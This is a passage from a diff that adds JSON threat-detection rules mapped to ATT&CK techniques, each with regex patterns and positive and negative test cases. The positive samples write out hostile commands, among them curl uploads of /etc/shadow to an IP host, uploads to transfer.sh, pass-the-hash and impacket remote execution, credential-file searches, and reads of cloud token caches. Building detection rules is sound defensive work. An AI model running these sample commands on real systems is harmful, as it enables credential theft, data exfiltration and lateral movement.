+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell New-ADUser -Name svc"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net user svc_backup /domain"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\net.exe",
+      "command": "net user guest"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-cloud-user-or-sa-create",
+   "name": "Cloud user or service account created",
+   "description": "aws iam create-user, az ad user create or gcloud iam service-accounts create via CLI. Routine in provisioning, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1136.003",
+   "technique_name": "Create Account: Cloud Account",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(aws|az|gcloud)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(iam\\s+create-user|ad\\s+user\\s+create|iam\\s+service-accounts\\s+create)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "cloud"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws iam create-user --user-name backdoor"
+     },
+     {
+      "executable": "/usr/bin/az",
+      "command": "az ad user create --display-name x --user-principal-name x@y.com --password p"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws iam get-user"
+     },
+     {
+      "executable": "/usr/bin/az",
+      "command": "az ad user list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-office-startup-addin-file",
+   "name": "Add-in or template dropped in an Office startup folder",
+   "description": "A .dotm/.wll/.xlam/.xll file is created in Word STARTUP or Excel XLSTART, which Office loads on every start.",
+   "tactic": "Persistence",
+   "technique": "T1137.001",
+   "technique_name": "Office Application Startup: Office Template Macros",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\microsoft\\\\(word\\\\startup|excel\\\\xlstart)\\\\[^\\\\]+\\.(dotm?|wll|xlam|xll|xlsm)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "office"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\upd.wll",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\readme.txt",
+      "operation": "create"
+     },
+     {
+      "path": "C:\\Users\\a\\Documents\\report.dotm",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-browser-load-extension-flag",
+   "name": "Browser started with --load-extension",
+   "description": "Chromium-based browser launched with --load-extension pointing at an unpacked extension, outside the store.",
+   "tactic": "Persistence",
+   "technique": "T1176",
+   "technique_name": "Software Extensions",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(chrome|msedge|brave|chromium|google-chrome|chrome_proxy)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--load-extension="
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "browser-ext"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command": "chrome.exe --load-extension=C:\\Users\\a\\AppData\\Local\\Temp\\ext"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command": "chrome.exe https://example.com"
+     },
+     {
+      "executable": "/usr/bin/chromium",
+      "command": "chromium --incognito"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-indirect-command-exec",
+   "name": "Indirect command execution via forfiles, pcalua or scriptrunner",
+   "description": "forfiles /c, pcalua -a or scriptrunner -appvscript launch another command without cmd or PowerShell as the visible parent.",
+   "tactic": "Defense Evasion",
+   "technique": "T1202",
+   "technique_name": "Indirect Command Execution",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(forfiles)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "/c\\s+\\\\?\\\"?(cmd(\\.exe)?\\s+/c\\s+)?(calc|powershell|pwsh|mshta|wscript|cscript|rundll32|regsvr32|certutil|bitsadmin)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(pcalua)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s-a\\s"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(scriptrunner)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "-appvscript"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "lolbin"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\forfiles.exe",
+      "command": "forfiles /p C:\\Windows\\System32 /m notepad.exe /c \\\"cmd /c calc.exe\\\""
+     },
+     {
+      "executable": "C:\\Windows\\System32\\pcalua.exe",
+      "command": "pcalua.exe -a calc.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\forfiles.exe",
+      "command": "forfiles /p C:\\logs /s /m *.log /d -30 /c \\\"del @path\\\""
+     },
+     {
+      "executable": "C:\\Windows\\System32\\pcalua.exe",
+      "command": "pcalua.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-reader-spawns-interpreter",
+   "name": "Document reader spawns a shell or script host",
+   "description": "A PDF or document reader (Acrobat, Reader, Foxit, Sumatra) has a command interpreter or script host as its child, typical of a client-side exploit.",
+   "tactic": "Execution",
+   "technique": "T1203",
+   "technique_name": "Exploitation for Client Execution",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(acrord32|acrobat|foxitreader|foxitphantom|sumatrapdf)(\\.exe)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|sh|bash)(\\.exe)?$"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "client-exploit"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c whoami",
+      "parent_exe": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\AcroCEF.exe",
+      "command": "AcroCEF.exe --type=renderer",
+      "parent_exe": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c dir",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-exec-from-archive-viewer-temp",
+   "name": "Executable run from an archive viewer temp extraction",
+   "description": "A process image is located in a Temp folder created by an archive viewer (Temp1_*.zip, Rar$*, 7z*), meaning it was run straight out of an opened archive.",
+   "tactic": "Execution",
+   "technique": "T1204",
+   "technique_name": "User Execution",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "\\\\temp\\\\(temp\\d+_[^\\\\]+\\.zip|rar\\$[^\\\\]+|7z[^\\\\]+|wz[^\\\\]+)\\\\.+\\.(exe|scr|com|js|vbs|bat|cmd|hta|jar)$"
+   },
+   "tags": [
+    "gap2",
+    "archive"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\a\\AppData\\Local\\Temp\\Temp1_invoice.zip\\invoice.exe",
+      "command": "invoice.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Users\\a\\AppData\\Local\\Temp\\chrome_update\\setup.exe",
+      "command": "setup.exe"
+     },
+     {
+      "executable": "C:\\Program Files\\7-Zip\\7zFM.exe",
+      "command": "7zFM.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-mail-client-opens-ip-url",
+   "name": "Mail or chat client launches a browser to an IP-literal URL",
+   "description": "Outlook, Thunderbird, Teams or Word is the parent of a browser opened on an http(s) URL with an IP-address host, a malicious-link click pattern.",
+   "tactic": "Execution",
+   "technique": "T1204.001",
+   "technique_name": "User Execution: Malicious Link",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "parent_exe",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(outlook|thunderbird|teams|ms-teams|winword|slack)(\\.exe)?$"
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(chrome|msedge|firefox|brave|iexplore)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}(\\.\\d{1,3}){3}[:/]"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "phishing-link"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command": "chrome.exe http://203.0.113.7/login",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command": "chrome.exe https://example.com/login",
+      "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+     },
+     {
+      "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command": "chrome.exe http://203.0.113.7/",
+      "parent_exe": "C:\\Windows\\explorer.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-wiki-bulk-extraction",
+   "name": "Bulk extraction from a wiki or document repository API",
+   "description": "curl/wget/python hitting a Confluence or SharePoint REST search/content endpoint with a large limit or CQL query, pulling repository content in bulk.",
+   "tactic": "Collection",
+   "technique": "T1213",
+   "technique_name": "Data from Information Repositories",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(/rest/api/(content|search)\\S*(limit=\\d{3,}|cql=)|/_api/(web/lists|search/query)\\S*(rowlimit=\\d{3,}|top=\\d{3,}))"
+   },
+   "tags": [
+    "gap2",
+    "repository"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -u a:b 'https://wiki.corp/rest/api/content?limit=1000&expand=body.storage'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://wiki.corp/rest/api/content/123"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://example.com/"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-secret-file-search",
+   "name": "Filesystem search for key, vault or credential files",
+   "description": "find/dir/Get-ChildItem sweeping for kdbx, pfx, p12, ppk, ovpn or id_rsa files.",
+   "tactic": "Collection",
+   "technique": "T1005",
+   "technique_name": "Data from Local System",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(find|dir|get-childitem|gci|locate|mdfind)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\*\\.(kdbx|pfx|p12|ppk|ovpn)|-name\\s+\\\"?id_(rsa|ed25519)|-include\\s+\\*\\.(kdbx|pfx|p12|ppk))"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "collection"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find / -name *.kdbx -type f"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c dir /s /b C:\\*.pfx *.kdbx"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/find",
+      "command": "find . -name *.go"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c dir C:\\Users"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-impacket-remote-exec",
+   "name": "Impacket remote-execution script run",
+   "description": "psexec.py, smbexec.py, wmiexec.py, atexec.py or dcomexec.py executed: remote command execution over several remote-service protocols.",
+   "tactic": "Lateral Movement",
+   "technique": "T1021",
+   "technique_name": "Remote Services",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(^|[\\\\/\\s])(impacket-)?(psexec|smbexec|wmiexec|atexec|dcomexec)(\\.py)?\\s+\\S+@"
+   },
+   "tags": [
+    "gap2",
+    "impacket"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 wmiexec.py corp/admin@10.0.0.7"
+     },
+     {
+      "executable": "/usr/bin/impacket-psexec",
+      "command": "impacket-psexec corp/admin@10.0.0.9"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 manage.py runserver"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh admin@10.0.0.9"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-ps-char-array-obfuscation",
+   "name": "PowerShell command rebuilt from character codes or XOR",
+   "description": "A PowerShell command combines [char] code concatenation, or -bxor decoding with FromBase64String/-join, to rebuild a payload.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027",
+   "technique_name": "Obfuscated Files or Information",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "any": [
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(\\[char\\]\\s*\\d+\\s*[,+]\\s*){3,}"
+       },
+       {
+        "all": [
+         {
+          "field": "command",
+          "op": "regex",
+          "pattern": "-bxor"
+         },
+         {
+          "field": "command",
+          "op": "regex",
+          "pattern": "frombase64string|-join"
+         }
+        ]
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "obfuscation"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c ([char]105+[char]101+[char]120+[char]32)"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell $b=[Convert]::FromBase64String($s); $o=$b|%{$_ -bxor 35}"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell [char]65"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Get-ChildItem"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-cmd-caret-or-tick-obfuscation",
+   "name": "Command line obfuscated with carets or PowerShell backticks",
+   "description": "Sequences of single characters separated by carets in cmd, or letters broken up by backticks in PowerShell.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027.010",
+   "technique_name": "Command Obfuscation",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(cmd)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(\\b\\w\\^){4,}\\w"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(powershell|pwsh)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\b\\w`\\w`\\w`\\w"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "obfuscation"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c p^o^w^e^r^s^h^e^l^l -nop"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell I`n`v`o`k`e-Expression $x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c echo a^&b"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell Write-Host `n"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-compile-in-tmp-and-run",
+   "name": "Compiler writes a binary into a world-writable or shared-memory path",
+   "description": "gcc/cc/clang output (-o) targets /dev/shm, /var/tmp or a hidden file in /tmp; compile-after-delivery keeps source rather than a binary on disk.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027.004",
+   "technique_name": "Obfuscated Files or Information: Compile After Delivery",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(gcc|cc|clang|tcc)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-o\\s*(/dev/shm|/var/tmp|/tmp/\\.)\\S*"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "compile"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/gcc",
+      "command": "gcc x.c -o /dev/shm/.k"
+     },
+     {
+      "executable": "/usr/bin/cc",
+      "command": "cc a.c -o /tmp/.hidden"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/gcc",
+      "command": "gcc main.c -o main"
+     },
+     {
+      "executable": "/usr/bin/gcc",
+      "command": "gcc -c lib.c -o /tmp/lib.o"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-csc-vbc-from-temp",
+   "name": "csc or vbc compiles into a user-writable path",
+   "description": "csc.exe, vbc.exe or jsc.exe invoked with an output in a temp, public or AppData path, typical of loader compilation.",
+   "tactic": "Defense Evasion",
+   "technique": "T1027.004",
+   "technique_name": "Obfuscated Files or Information: Compile After Delivery",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(csc|vbc|jsc)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/out:\\S*\\\\(temp|users\\\\public|appdata|programdata)\\\\"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "compile"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+      "command": "csc.exe /out:C:\\Users\\Public\\a.exe C:\\Users\\Public\\a.cs"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+      "command": "csc.exe /out:bin\\app.exe src\\app.cs"
+     },
+     {
+      "executable": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+      "command": "csc.exe /?"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-system-binary-name-wrong-path",
+   "name": "System process name running outside its system directory",
+   "description": "An image named svchost, lsass, csrss, services, smss, winlogon, wininit or spoolsv runs from a path outside C:\\Windows\\System32 or SysWOW64.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036",
+   "technique_name": "Masquerading",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "\\\\(svchost|lsass|csrss|services|smss|winlogon|wininit|spoolsv)\\.exe$"
+     },
+     {
+      "not": {
+       "field": "executable",
+       "op": "regex",
+       "pattern": "^[a-z]:\\\\windows\\\\(system32|syswow64)\\\\"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "masquerade"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\a\\AppData\\Local\\Temp\\svchost.exe",
+      "command": "svchost.exe"
+     },
+     {
+      "executable": "C:\\ProgramData\\lsass.exe",
+      "command": "lsass.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\svchost.exe",
+      "command": "svchost.exe -k netsvcs"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\lsass.exe",
+      "command": "lsass.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-double-extension-executable",
+   "name": "Process image with a document double extension",
+   "description": "The executable path ends in a document or image extension followed by an executable extension, e.g. invoice.pdf.exe.",
+   "tactic": "Execution",
+   "technique": "T1036.007",
+   "technique_name": "Masquerading: Double File Extension",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "executable",
+    "op": "regex",
+    "pattern": "\\.(pdf|docx?|xlsx?|pptx?|jpe?g|png|txt|zip|rtf)\\.(exe|scr|com|bat|cmd|js|vbs|hta)$"
+   },
+   "tags": [
+    "gap2",
+    "masquerade"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Users\\a\\Downloads\\invoice.pdf.exe",
+      "command": "invoice.pdf.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
+      "command": "Acrobat.exe invoice.pdf"
+     },
+     {
+      "executable": "C:\\Users\\a\\Downloads\\setup.exe",
+      "command": "setup.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-curl-upload-to-ip",
+   "name": "curl or wget uploads a local file to an IP-literal URL",
+   "description": "curl -T/--upload-file/--data-binary @file or -F file=@ to an http(s) IP host, exfiltration over an existing web channel.",
+   "tactic": "Exfiltration",
+   "technique": "T1041",
+   "technique_name": "Exfiltration Over C2 Channel",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(curl|wget)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-T\\s|--upload-file|--data-binary\\s+@|-F\\s+\\S*=@|--post-file)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}(\\.\\d{1,3}){3}[:/]"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "exfil"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T /etc/shadow http://203.0.113.9:8000/up"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -F file=@a.tar http://203.0.113.9/u"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -T a.tar https://artifacts.corp.example/up"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://203.0.113.9/file"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-upload-to-file-drop-service",
+   "name": "Upload to an anonymous file-drop service from the command line",
+   "description": "curl/wget/powershell posting a file to transfer.sh, file.io, gofile, bashupload, 0x0.st, temp.sh or pixeldrain.",
+   "tactic": "Exfiltration",
+   "technique": "T1567",
+   "technique_name": "Exfiltration Over Web Service",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(transfer\\.sh|file\\.io|gofile\\.io|bashupload\\.com|0x0\\.st|temp\\.sh|pixeldrain\\.com|anonfiles|catbox\\.moe)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-T\\s|--upload-file|--data-binary|\\s-F\\s|uploadfile|-method\\s+(put|post)|\\s-d\\s+@)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "exfil"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl --upload-file ./dump.tgz https://transfer.sh/dump.tgz"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -F file=@a.zip https://file.io"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://transfer.sh/abc/get.txt -o get.txt"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -F file=@a.zip https://upload.corp.example/"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-cloud-token-mint-or-read",
+   "name": "Cloud access token printed or token cache read",
+   "description": "az account get-access-token, gcloud auth print-access-token, aws sts get-session-token or reading ~/.azure/accessTokens.json, gcloud credentials.db. Tools and scripts do this too, so informational.",
+   "tactic": "Credential Access",
+   "technique": "T1528",
+   "technique_name": "Steal Application Access Token",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(az\\s+account\\s+get-access-token|gcloud\\s+auth\\s+(application-default\\s+)?print-(access|identity)-token|aws\\s+sts\\s+get-(session|federation)-token)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(cat|cp|tar|scp|base64|curl).*(\\.azure/(accesstokens|msal_token_cache)|\\.config/gcloud/(credentials\\.db|application_default_credentials))"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "tokens"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/az",
+      "command": "az account get-access-token --resource https://management.azure.com"
+     },
+     {
+      "executable": "/bin/cat",
+      "command": "cat /home/a/.azure/accessTokens.json"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/az",
+      "command": "az account show"
+     },
+     {
+      "executable": "/bin/cat",
+      "command": "cat /home/a/.bashrc"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-pass-the-hash-material",
+   "name": "Pass-the-hash style invocation",
+   "description": "sekurlsa::pth, xfreerdp /pth:, pth-winexe or an impacket -hashes LM:NT argument supplies an NTLM hash instead of a password.",
+   "tactic": "Defense Evasion",
+   "technique": "T1550",
+   "technique_name": "Use Alternate Authentication Material",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(sekurlsa::pth|/pth:[0-9a-f]{32}|pth-(winexe|smbclient|wmic)|-hashes\\s+[0-9a-f:]*:[0-9a-f]{32}|-hash\\s+[0-9a-f]{32})"
+   },
+   "tags": [
+    "gap2",
+    "pth"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/xfreerdp",
+      "command": "xfreerdp /v:10.0.0.7 /u:admin /pth:8846f7eaee8fb117ad06bdd830b7586c"
+     },
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c a@10.0.0.7"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/xfreerdp",
+      "command": "xfreerdp /v:10.0.0.7 /u:admin /p:secret"
+     },
+     {
+      "executable": "/usr/bin/sha256sum",
+      "command": "sha256sum file.iso"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-bearer-token-on-command-line",
+   "name": "Static bearer or JWT supplied on a command line",
+   "description": "A JWT-shaped token (eyJ...) passed to curl/kubectl/az as a bearer, --token or --access-token argument: an application access token reused directly.",
+   "tactic": "Defense Evasion",
+   "technique": "T1550.001",
+   "technique_name": "Use Alternate Authentication Material: Application Access Token",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(authorization:\\s*bearer\\s+eyj[a-z0-9_-]{10,}\\.[a-z0-9_-]{10,}|--token[= ]eyj[a-z0-9_-]{10,}|--access-token[= ]eyj[a-z0-9_-]{10,})"
+   },
+   "tags": [
+    "gap2",
+    "tokens"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
